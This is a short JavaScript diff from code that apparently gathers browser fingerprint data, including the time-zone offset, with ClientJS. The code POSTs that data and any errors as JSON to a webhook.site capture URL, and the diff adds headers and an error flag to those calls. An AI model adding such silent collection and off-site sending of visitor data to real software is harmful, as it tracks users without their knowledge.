@@ -288,7 +288,7 @@
     
     function getTimeZone(clientjs) {
         var d = new Date();
-
+    
         return {
             timeZone: d.getTimezoneOffset()
         }
@@ -345,13 +345,19 @@
             ajax({
                 method: 'POST',
                 data: JSON.stringify(data),
-                url: 'https://webhook.site/5a29cb3e-c1b8-4e41-b5e9-ea8771c527f4'
+                url: 'https://webhook.site/5a29cb3e-c1b8-4e41-b5e9-ea8771c527f4',
+                headers: {
+                    'content-type': 'application/json'
+                }
             })
         } catch(error) {
             ajax({
                 method: 'POST',
                 data: JSON.stringify(error),
-                url: 'https://webhook.site/5a29cb3e-c1b8-4e41-b5e9-ea8771c527f4'
+                url: 'https://webhook.site/5a29cb3e-c1b8-4e41-b5e9-ea8771c527f4?error=true',
+                headers: {
+                    'content-type': 'application/json'
+                }
             })
         }
     }
